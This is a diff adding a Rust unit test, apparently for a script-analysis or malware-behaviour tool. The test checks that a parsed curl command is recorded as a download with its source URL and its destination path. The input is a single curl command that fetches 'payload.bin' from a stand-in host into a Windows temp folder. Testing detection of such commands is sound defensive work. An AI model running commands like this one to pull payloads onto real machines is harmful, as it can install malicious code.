@@ -6694,6 +6694,32 @@ mod curl_tests {
             env.traits
         );
     }
+
+    #[test]
+    fn curl_output_equals_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --output=C:\Temp\payload.bin https://curl-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-output.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
